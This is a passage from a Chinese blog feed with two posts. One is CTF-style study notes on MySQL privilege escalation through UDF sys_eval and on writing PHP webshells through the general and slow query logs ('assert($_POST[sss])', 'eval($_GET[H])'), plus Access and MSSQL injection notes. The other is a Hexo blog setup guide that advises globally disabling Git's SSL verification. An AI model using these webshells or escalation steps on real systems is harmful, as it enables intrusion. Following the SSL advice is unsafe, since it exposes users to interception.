href="https://www.freebuf.com/articles/web/283566.html">UDF提权详解</a></p><p>udf 全称为：user defined function，意为<strong>用户自定义函数</strong>；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。</p><p><strong>提权步骤</strong></p><blockquote><p>1.把含有自定义函数(如执行系统调用函数“sys_eval”)的dll文件(如linux为so文件等)放入特定文件夹下</p><p>2.声明引用这个dll文件中的自定义函数</p><p>3.使用这个自定义的函数系统调用完成提权</p></blockquote><p>udf 文件后缀一般为 dll，由C、C++编写</p><blockquote><p>先到sqlmap上找到udf文件，要注意到这个文件的后缀是so_,不是so ，所以还需要编译一下，具体原因请仔细看上方链接。</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641605c14b31.png" alt="image-20240309220935476"></p><p>利用 cloak.py 给 udf文件解码</p><p><img src="https://bu.dusays.com/2024/05/13/6641605bbb1ee.png" alt="image-20240309220959335"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cloak.py -d -i  lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><p>修改名称为aaa.so</p><p>上传这个文件同样需要路径，这里又要引入一个新概念</p><p><strong>plugin</strong></p><p>plugin是插件的意思,通常是用与对某个现有的架构进行扩展。</p><p>我们把这个udf文件放入到plugin文件才能真正产生作用。</p><p>实施</p><blockquote><ol><li>找到数据库名称，密码</li><li>查找plugin路径</li><li>上传udf文件</li><li>执行系统命令</li></ol></blockquote><p>首先在配置文件找到了数据库登陆信息</p><p><img src="https://bu.dusays.com/2024/05/13/6641605dd1fc9.png" alt="image-20240309221220889"></p><p>登陆数据库，查找plugin路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605cb9e55.png" alt="image-20240309221258584"></p><p> 在该路径把udf文件上传，aaa.so</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ea17da.png" alt="image-20240309221329629"></p><p> 之后在数据库输入命令，执行提权文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname &#x27;aaa.so&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605ccef80.png" alt="image-20240309221355888"></p><p>命令执行打开flag</p><p><img src="https://bu.dusays.com/2024/05/13/6641605cb5970.png" alt="image-20240309221424676"></p><blockquote><p>如果MySQL版本大于5.1，udf.dll文件必须放置在MySQL安装目录的lib\plugin文件夹下才可以创建自定义函数。该目录默认是不存在的，需要使用WebShall找到MySQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录。</p><p>如果MySQL版本小于5.1,udf.dll文件在Windows Server 2003 下放置在C:\Windows\system32目录中</p></blockquote><h2 id="日志马"><a href="#日志马" class="headerlink" title="日志马"></a>日志马</h2><h3 id="全局日志写马"><a href="#全局日志写马" class="headerlink" title="全局日志写马"></a>全局日志写马</h3><p>我们所有的数据库的都有一个存放日志的文件，这个文件可以会进行记录数据库的操作语句，也可能不会记录数据库的操作语句，这却决于两个全局变量：</p><p><code>general_log</code>&#x3D;&#x3D;&gt;日志保存状态，有两个状态，ON代表开启 OFF代表关闭。</p><p><code>general_log_file</code>&#x3D;&#x3D;&gt; 日志的保存路径。</p><p><code>show global variables like &quot;%general_log%&quot;;</code> 查看这两个日志文件相关的配置</p><p><img src="https://bu.dusays.com/2024/05/13/6641605bd88d3.png" alt="image-20240310185353991"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\Extensions\MySQL5.7.26\data\LAPTOP-R496QJ56.log</span><br></pre></td></tr></table></figure><p>可以看到这里的日志记录状态是处于关闭状态，那么我们需要设置以下使这个选项打开。<br><code>SET GLOBAL general_log=&#39;ON&#39;;</code> 打开日志记录</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b19121.png" alt="image-20240310185455069"></p><p><code>set global general_log_file=&#39;D:、\\phpstudy_pro\\WWW\\log.php&#39;; </code> 设置日志存储路径,写马，这里需要注意的就是需要使用双斜线，然后还有就是日志文件必须是.php文件防止不能被解析</p><p>设置完毕之后就是代表着所有的执行语句都会记录到日志文件当中，不管执行成功与否。</p><p><code>select &#39;&lt;?php assert($_POST[sss]);?&gt;&#39;;</code> 查询语句，其实就是写马，让日志文件众留下这样一句查询语句。那么可以使用这个木马了</p><p><img src="https://bu.dusays.com/2024/05/13/6641605d83b57.png" alt="image-20240310192303309"></p><p>同样 也需要知道文件路径</p><h3 id="慢日志写马"><a href="#慢日志写马" class="headerlink" title="慢日志写马"></a>慢日志写马</h3><p>慢日志全称为慢查询日志（Slow Query Log），主要用来记录在 MySQL 中执行时间超过指定时间的 SQL 语句。通过慢查询日志，可以查找出哪些语句的执行效率低，以便进行优化。</p><p>默认情况下，MySQL 并没有开启慢日志，可以通过修改 slow_query_log 参数来打开慢日志。与慢日志相关的参数介绍如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">slow_query_log：是否启用慢查询日志，默认为0，可设置为0、1，1表示开启。</span><br><span class="line">slow_query_log_file：指定慢查询日志位置及名称，默认值为host_name-slow.log，可指定绝对路径。</span><br><span class="line">long_query_time：慢查询执行时间阈值，超过此时间会记录，默认为10，单位为s。</span><br><span class="line">log_output：慢查询日志输出目标，默认为file，即输出到文件。</span><br><span class="line">log_timestamps：主要是控制 error log、slow log、genera log 日志文件中的显示时区，默认使用UTC时区，建议改为 SYSTEM 系统时区。</span><br><span class="line">log_queries_not_using_indexes：是否记录所有未使用索引的查询语句，默认为off。</span><br><span class="line">min_examined_row_limit：对于查询扫描行数小于此参数的SQL，将不会记录到慢查询日志中，默认为0。</span><br><span class="line">log_slow_admin_statements：慢速管理语句是否写入慢日志中，管理语句包含 alter table、create index 等，默认为 off 即不写入。</span><br></pre></td></tr></table></figure><p>一般情况下，我们只需开启慢日志记录，配置下阈值时间，其余参数可按默认配置。对于阈值时间，可灵活调整，比如说可以设置为 1s 或 3s 。</p><p>在配置文件中，我们可以设置以下几个慢日志相关参数：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">慢查询日志相关配置，可根据实际情况修改</span><br><span class="line">vim /etc/my.cnf </span><br><span class="line">[mysqld] </span><br><span class="line">slow_query_log = 1</span><br><span class="line">slow_query_log_file = /data/mysql/logs/slow.log</span><br><span class="line">long_query_time = 1</span><br><span class="line">log_timestamps = SYSTEM</span><br><span class="line">log_output = FILE</span><br></pre></td></tr></table></figure><p>下面我们具体看下，慢日志会记录哪些内容？我们执行一条较慢的查询 SQL ，来看下在慢日志中的体现。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 该条SQL执行时间超过阈值</span><br><span class="line"></span><br><span class="line"># Time: 2021-05-13T17:38:03.687811+08:00</span><br><span class="line"># User@Host: root[root] @  [192.168.85.0]  Id: 2604943</span><br><span class="line"># Query_time: 1.099889  Lock_time: 0.000144 Rows_sent: 39  Rows_examined: 45305</span><br><span class="line">SET timestamp=1620898683;</span><br><span class="line">select * from test_table where col_name like &#x27;%测试%&#x27;;</span><br></pre></td></tr></table></figure><p>如果启用了慢速查询日志，并且选择了 FILE 作为输出目标，则写入日志的每个语句都以 # 字符开头。对于每一组慢SQL，第一行记录的是该条 SQL 执行的时刻（如果 log_timestamps 参数为 UTC ，则改时间会显示 UTC 时区时间），第二行记录的是执行该语句的用户和 IP 以及链接 id ，第三行的几个字段解释如下：</p><ul><li><strong>Query_time</strong>: duration 语句执行时间，以秒为单位。</li><li><strong>Lock_time</strong>: duration 获取锁的时间(以秒为单位)。</li><li><strong>Rows_sent</strong>: N 发送给 Client 端的行数。</li><li><strong>Rows_examined</strong>: N 服务器层检查的行数(不计算存储引擎内部的任何处理)。</li></ul><p>下面两行分别是此语句执行时候的时间戳和具体慢 SQL 。</p><p>在实际环境下，不建议开启 log_queries_not_using_indexes 参数，此参数打开后可能导致慢日志迅速增长。对于慢日志的筛选与分析，我们可以借助 mysqldumpslow、pt-query-digest 等工具来分析。对于慢日志文件，要定期进行归档处理，比如可以暂时关闭慢日志，然后将旧文件重命名，之后再开启慢日志，这样就会写入新的日志文件中，有效减小日志体积。</p><p>1.开启日志功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET GLOBAL slow_query_log_file=&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>2.设置日志存储路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET GLOBAL slow_query_log_file=&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>3.执行sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_GET[H])?&gt;&#x27; or SLEEP(11);</span><br></pre></td></tr></table></figure><p>同样需要知道文件路径</p><h1 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h1><p>与前面的mysql的注入方式大同小异</p><h2 id="access数据库"><a href="#access数据库" class="headerlink" title="access数据库"></a>access数据库</h2><p>它的一些主要组件是表格、表单、报告和查询 没有库的概念</p><p><img src="https://bu.dusays.com/2024/05/13/6641605e8b2b8.png" alt="image-20240310132018529"></p><p>也是可以用sql语句查询</p><p>也可以直接找到他的位置下下来</p><p>也就是说access数据库没有information_schema库</p><p>注入：</p><p><img src="https://bu.dusays.com/2024/05/13/6641605df291a.png" alt="image-20240310132912538"></p><p>不同的数据库报错回显不同</p><p>主要靠猜（爆破）</p><p>包括mysql5.0之前都是这样</p><p>通过exists来（有数据为true）</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b3dc70.png" alt="image-20240310134049972"></p><p><img src="https://bu.dusays.com/2024/05/13/6641605b4d1d4.png" alt="image-20240310134114047"></p><p>猜完表名、字段名后猜字段数据长度</p><p>用top函数 top&#x3D;limit</p><p>len&#x3D;lenth</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b270df.png" alt="image-20240310134029761"></p><p>然后猜字段数据内容</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b25a36.png" alt="image-20240310134416367"></p><p>asc&#x3D;ascii mid&#x3D;substr</p><p>也可以使用order by猜字段数目</p><p><img src="https://bu.dusays.com/2024/05/13/6641605bd3271.png" alt="image-20240310135216187"></p><p>然后用union select</p><p><img src="https://bu.dusays.com/2024/05/13/6641605d2d1e0.png" alt="image-20240310140308226"></p><p>mysql跨库查询</p><p>库名.表名</p><p><img src="https://bu.dusays.com/2024/05/13/6641605bc7efa.png" alt="image-20240310140844487"></p><p>access的跨库查询更加苛刻</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ebfb84.png" alt="image-20240310142140165"></p><p>基本不用</p><h2 id="mssql数据库"><a href="#mssql数据库" class="headerlink" title="mssql数据库"></a>mssql数据库</h2><p>全称Microsoftsqlserver</p><p><img src="https://bu.dusays.com/2024/05/13/6641605f18c89.png" alt="image-20240310142314985"></p><p>也是和mysql相似 只是报错信息不同</p><p>order by 3&#x3D;order by 1,2,3</p><p>sqlserver对数据类型严格</p><p>主要使用报错注入</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b4a234.png" alt="image-20240310142928752"></p><p>爆库</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b5340c.png" alt="image-20240310143914302"></p><p><code>&gt;0</code></p><p>也是猜库名</p><p>爆表</p><p><img src="https://bu.dusays.com/2024/05/13/6641605dc2a19.png" alt="image-20240310182447077"></p><p>爆列</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c1498c.png" alt="image-20240310182531770"></p><p>爆数据</p><p><img src="https://bu.dusays.com/2024/05/13/6641605d5c287.png" alt="image-20240310182615415"></p><p>针对mssql不同的权限有不同的注入手法</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 后端漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/2024/05/12/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/05/12/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>这里我使用hexo搭建的个人博客</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>下载[nodejs](<a href="https://nodejs.org/en/">Node.js — 随处运行 JavaScript (nodejs.org)</a>)</p><p>我是一路next</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da99016.png" alt="image-20240502162734610"></p><p>下载[git](<a href="https://git-scm.com/downloads">Git - Downloads (git-scm.com)</a>)</p><p>一样next</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d4313.png" alt="image-20240502163015637"></p><blockquote><p>node -v</p><p>npm -v</p><p>git -v</p></blockquote><p>下载hexo</p><p>用管理员身份打开cmd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9a17df.png" alt="image-20240502163428108"></p><h2 id="搭建仓库"><a href="#搭建仓库" class="headerlink" title="搭建仓库"></a>搭建仓库</h2><p>成功下载好工具之后，我们开始搭建GitHub存储静态页面的仓库</p><p>登录github</p><p>新建一个仓库</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d65f0.png" alt="image-20240502163854157"></p><p>名字必须是账户名.github.io</p><p>要public</p><p>勾选 Add a README file</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da81881.png" alt="image-20240502170815788"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9b6803.png" alt="image-20240502170927546"></p><h2 id="生成SSH-key"><a href="#生成SSH-key" class="headerlink" title="生成SSH key"></a>生成SSH key</h2><p>git执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6dc24a18.png" alt="image-20240502171118745"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dbbfba3.png" alt="image-20240502171219549"></p><p>一直回车(4次)</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dadf6ba.png" alt="image-20240502171259459"></p><p>找到生成的文件</p><p><code>C:\Users\admin\.ssh</code></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da4487b.png" alt="image-20240502171410100"></p><p>用任意文件编辑器打开id_rsa.pub</p><p>全选复制</p><p>在github的setting中打开ssh</p><p>新建一个ssh key</p><p>把刚刚复制的粘贴进去</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6daabd0a.png" alt="image-20240502171802709"></p><p>创建</p><p>验证：<br>打开git </p><p>输入<code>ssh -T git@github.com</code></p><p>我这里报错：<br><img src="https://bu.dusays.com/2024/05/12/6640e6d9a8c51.png" alt="image-20240502172545147"></p><p><strong>解决：</strong></p><p>错误提示的是连接**<code>github.com</code>**的22端口被拒绝了。可以简单理解为此门不通，既然这个端口号走不通，那换一个端口号试试看</p><p>直接在该文件夹下新建config.txt文件，将下面的命令直接粘贴进去,保存退出后，把此文件的.txt后缀删除（重命名）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  Hostname ssh.github.com</span><br><span class="line">  Port 443</span><br></pre></td></tr></table></figure><p>再试  后跟yes</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dac9377.png" alt="image-20240502173004790"></p><p>成功</p><h2 id="本地生成博客内容"><a href="#本地生成博客内容" class="headerlink" title="本地生成博客内容"></a>本地生成博客内容</h2><p>再任意位置新建文件夹</p><p>打开 git</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>初始化</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d0284.png" alt="image-20240502173529224"></p><p>报错 前面加了npx也一样</p><p><strong>解决：</strong><br>错误： git SSL certificate problem: unable to get local issuer certificate</p><blockquote><p>这个问题是由于没有配置信任的服务器HTTPS验证。默认，<a href="https://so.csdn.net/so/search?q=cURL&spm=1001.2101.3001.7020">cURL</a>被设为不信任任何CAs，就是说，它不信任任何服务器验证</p></blockquote><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global http.sslVerify false</span><br></pre></td></tr></table></figure><p>再初始化 即可</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6ec522a1.png" alt="image-20240502174237835"></p><p>成功</p><p>然后安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo install</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6da3976c.png" alt="image-20240502174432493"></p><p>接下来依次输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g     生成</span><br><span class="line">hexo s     本地部署</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d447c.png" alt="image-20240502174535921"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9c949f.png" alt="image-20240502174621298"></p><p>给的这个URL就是在本地部署的博客</p><p>给的这个localhost:4000 端口被占用了 请求被拒绝</p><p>改一下端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s -p 5000</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6dbab3cf.png" alt="image-20240502175245789"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e71393770.png" alt="image-20240502175220172"></p><p>成功</p><h2 id="上线博客"><a href="#上线博客" class="headerlink" title="上线博客"></a>上线博客</h2><p>进入之前的Blog文件夹，用打开_config.yml</p><p>划到最后</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9b1792.png" alt="image-20240502175505659"></p><p>将最后的tpye:”改为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type: git</span><br><span class="line">repository: </span><br><span class="line">branch: main</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9c3ebc.png" alt="image-20240502175611545"></p><p>注意首行缩进</p><p>回到github</p><p>把仓库的连接复制过来</p><p>粘贴到repository后面</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da9fc16.png" alt="image-20240502175921333"></p><p>在博客文件夹中打开git</p><p>执行</p><blockquote><p>hexo g     生成</p><p>hexo d     上传</p></blockquote><p><img src="https://bu.dusays.com/2024/05/12/6640e6dac3183.png" alt="image-20240502180349908"></p><p>这里我也是报错了</p><p><strong>解决</strong></p><p>要在<strong>站点目录</strong>下执行以上安装<code>hexo-deployer-git</code>插件的命令，所谓站点目录就是执行<code>hexo init</code>的目录</p><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6d99b973.png" alt="image-20240502180656958"></p><p>再执行hexo d</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d73c6.png" alt="image-20240502180732852"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dd1eaba.png" alt="image-20240502180825885"></p><p>成功</p><p>访问vvkladg0r.github.io</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dc7a03c.png" alt="image-20240502180922779"></p><p>成功</p><h2 id="Vercel部署"><a href="#Vercel部署" class="headerlink" title="Vercel部署"></a>Vercel部署</h2><p>Github提供的网址在国内的访问速度较慢，所以推荐在搭建完后用<a href="https://vercel.com/">Vercel</a>部署，再通过Vercel绑定到自己的域名上，这样会速度会很快。</p><p>因为Vercel给我们分配的域名在国内是无法访问的，所以我们需要把在Vercel部署的绑定到自己的域名上，这样就可以访问了。</p><p>这里大家可以选择购买域名</p><p>用 github连接Vercel账号</p><p>点击右上角的<code>Add New Project</code>创建新的项目，之后导入选项那里选择<code>Continue with Github</code>，这时候应该能看到你Github账号的仓库，选择你刚刚部署成功的存储静态博客的仓库<code>&lt;username&gt;.github.io</code>右边的<code>Import</code>选项，表示你要导入该仓库。</p><p>起一个只能有小写字母、数字或者或者连字符的项目名称，然后其他默认，点击<code>Deploy</code>，等待一分钟即可部署成功</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6ecc9c89.png" alt="image-20240505153802912"></p><p>部署成功</p><p>然后点<code>Continue to Dashboard</code></p><p><img src="https://bu.dusays.com/2024/05/12/6640e71ad5b7b.png" alt="image-20240505154312979"></p><p>成功</p><p>是我们现在还不能访问他给出的域，因为GFW把Vercel屏蔽了</p><p>绑定自定义域名：</p><p>点控制器里的Domains </p><p>查看当前的域，我们可以看到仅有Vercel给你预分配的一个域名，此时我们输入我们要用的域名，添加后他会提示你添加一条DNS解析记录。</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dae9ca5.png" alt="image-20240505154919950"></p><p>接下来在域名解析记录里面添加记录，其中记录类型对应<code>Type</code>，主机记录对应<code>Name</code>，记录值对应<code>Value</code>，其他的设置默认即可。</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dca9f65.png" alt="image-20240505161023476"></p><p>我这里是腾讯云：</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da4fde0.png" alt="image-20240505161336615"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dab3e86.png" alt="image-20240505161357741"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/05/12/6640e71199af3.png" alt="image-20240505161435423"></p><p>可以用自定义域名访问了</p><p>当你有了新的域名之后，需要将<code>[BlogRoot]\_config.yml</code>文件中的<code>url</code>配置项改为自己的新域名，这样博客的文章链接才会正确生成。</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9df4bc.png" alt="image-20240505194744268"></p><h2 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h2><p>这里我选择的是安知鱼主题</p><p><a href="https://docs.anheyu.com/">安知鱼主题</a>一款基于Butterfly主题修改的主题</p><p>这里还有很多<a href="https://hexo.io/themes/">hexo主题</a></p><p>我们根据它的官方文档安装</p><p>下载主题：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b main https://github.com/anzhiyu-c/hexo-theme-anzhiyu.git themes/anzhiyu</span><br></pre></td></tr></table></figure><p>在Blagfile文件中用vscode打开</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da4f282.png" alt="image-20240506140626319"></p><p>在vscode中打开终端 执行命令</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dacae57.png" alt="image-20240506141151070"></p><p>theme文件夹下出现了安知鱼的相关文件</p><p>这是主题的源码 以后更新的时候会覆盖所以源码 不是很方便</p><p>覆盖配置可以使<code>主题配置</code>放置在 anzhiyu 目录之外，避免在更新主题时丢失自定义的配置。</p><p>所以执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -rf ./themes/anzhiyu/_config.yml ./_config.anzhiyu.yml</span><br></pre></td></tr></table></figure><p>将主题的配置文件移出来</p><p>但是这是在linux&#x2F;mac下才能执行的命令</p><p>而我们window需要：</p><p>复制<code>/themes/anzhiyu/_config.yml</code>此文件到 hexo 根目录，并重命名为<code>_config.anzhiyu.yml</code></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da14661.png" alt="image-20240506142216602"></p><p>修改hexo主题配置</p><p>将_config.yml文件中的theme属性修改为anzhiyu</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da7a13b.png" alt="image-20240506142308758"></p><p>安装 pug 和 stylus 渲染插件:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>报错了：</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da00822.png" alt="image-20240506143045345"></p><p>解决：</p><p>根据他的提示先更新一下版本呢：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g npm@10.7.0</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9d8dee.png" alt="image-20240506143215947"></p><p>行</p><p>再跑一下刚刚的命令呢</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6db15c1a.png" alt="image-20240506143438304"></p><p>好像没有问题了</p><p>本地启用一下hexo看看呢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e6e73642e.png" alt="image-20240506143728560"></p><p>网页无变化 说明没安起</p><p>换一条命令呢：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save --registry=http://registry.npmmirror.com</span><br></pre></td></tr></table></figure><p>也有回显</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6d9ee8ec.png" alt="image-20240506144534900"></p><p>再部署看看</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da074c9.png" alt="image-20240506144650106"></p><p>这次好像可以了</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da74907.png" alt="image-20240506144735874"></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da55dc1.png" alt="image-20240506144754684"></p><p>应该没问题了</p><p>访问一下看看呢</p><p><img src="https://bu.dusays.com/2024/05/12/6640e703e6482.png" alt="image-20240506144857627"></p><p>行 本地访问没有问题</p><p><img src="https://bu.dusays.com/2024/05/12/6640e7030081b.png" alt="image-20240506144941111"></p><p>自定义域名访问没变</p><p>解决：</p><p>可能是更新花了一点时间</p><p>现在访问就是没问题的</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240506150442185.png" alt="image-20240506150442185"></p><h2 id="网站配置"><a href="#网站配置" class="headerlink" title="网站配置"></a>网站配置</h2><p>一般都在<code>_config.yml</code>中修改</p><p><img src="https://bu.dusays.com/2024/05/12/6640e6da13fe9.png" alt="image-20240506151958836"></p><p>主题的相关配置的话在<code>_config.anzhiyu.yml</code>里面 大家就自行修改吧</p><p><a href="https://docs.anheyu.com/">安知鱼官方配置文档</a></p><h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>我们在Blog文件夹中打开git bash,输入下方代码就可以生成新的文章md文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new 文章标题</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/12/6640e48e8bcd0.png" alt="image-20240512234724501"></p><p>文章是.md格式，在我们的Blog文件夹中的source&#x2F;_posts中</p><p><img src="https://bu.dusays.com/2024/05/12/6640e4e4793a0.png" alt="image-20240512234851152"></p><p>然后我们用Typora软件打开该.md文件就可以开始写文章了</p><p>Front-matter</p><p><code>Front-matter</code> 是 markdown 文件最上方以<code>---</code>分隔的区域，用于指定个别档案的变数。</p><ul><li>Page Front-matter 用于页面配置</li><li>Post Front-matter 用于文章页配置</li></ul><p>如果标注可选的参数，可根据自己需要添加，不用全部都写</p><p><strong>Page Front-matter：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MARKDOWN</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">type:</span><br><span class="line">comments:</span><br><span class="line">description:</span><br><span class="line">keywords:</span><br><span class="line">top_img:</span><br><span class="line">mathjax:</span><br><span class="line">katex:</span><br><span class="line">aside:</span><br><span class="line">aplayer:</span><br><span class="line">highlight_shrink:</span><br><span class="line">---</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">写法</th><th>解释</th></tr></thead><tbody><tr><td align="left">title</td><td>【必需】页面标题</td></tr><tr><td align="left">date</td><td>【必需】页面创建日期</td></tr><tr><td align="left">type</td><td>【必需】标籤、分类和友情链接三个页面需要配置</td></tr><tr><td align="left">updated</td><td>【可选】页面更新日期</td></tr><tr><td align="left">description</td><td>【可选】页面描述</td></tr><tr><td align="left">keywords</td><td>【可选】页面关键字</td></tr><tr><td align="left">comments</td><td>【可选】显示页面评论模块(默认 true)</td></tr><tr><td align="left">top_img</td><td>【可选】页面顶部图片</td></tr><tr><td align="left">mathjax</td><td>【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</td></tr><tr><td align="left">kates</td><td>【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</td></tr><tr><td align="left">aside</td><td>【可选】显示侧边栏 (默认 true)</td></tr><tr><td align="left">aplayer</td><td>【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</td></tr><tr><td align="left">highlight_shrink</td><td>【可选】配置代码框是否展开(true&#x2F;false)(默认为设置中highlight_shrink的配置)</td></tr></tbody></table><p><strong>Post Front-matter：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MARKDOWN</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top_img:</span><br><span class="line">comments:</span><br><span class="line">cover:</span><br><span class="line">toc:</span><br><span class="line">toc_number:</span><br><span class="line">toc_style_simple:</span><br><span class="line">copyright:</span><br><span class="line">copyright_author:</span><br><span class="line">copyright_author_href:</span><br><span class="line">copyright_url:</span><br><span class="line">copyright_info:</span><br><span class="line">mathjax:</span><br><span class="line">katex:</span><br><span class="line">aplayer:</span><br><span class="line">highlight_shrink:</span><br><span class="line">aside:</span><br><span 